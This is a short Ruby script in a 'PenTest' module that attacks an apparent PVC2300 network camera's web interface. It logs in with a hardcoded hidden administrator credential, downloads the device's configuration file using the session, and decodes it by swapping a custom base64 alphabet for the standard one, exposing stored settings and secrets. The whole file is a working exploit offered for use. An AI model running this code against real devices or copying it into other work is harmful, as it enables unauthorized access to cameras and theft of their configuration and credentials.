module PenTest
	class PVC2300
		include HTTParty
		@@my_base64chars  = "ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+"
		@@std_base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
		def initialize(host)
			@base_uri = host
		end
		def getSession()
			response = self.class.get("#{@base_uri}/oamp/System.xml?action=login&user=L1_admin&password=L1_51")
			return response.headers['sessionid']
		end
		def downloadFirmware(session)
			response = self.class.get("#{@base_uri}/oamp/System.xml?action=downloadConfigurationFile" , 
								:headers => {"sessionID" => session})
			File.open("camserver.config", 'w+') { |file| file.write(response) }
		end
		def readFirmware
			file = File.open("camserver.config", "rb")
			contents = file.read
			data = contents.tr(@@my_base64chars, @@std_base64chars)
			return Base64.decode64(data)
		end
	end
end
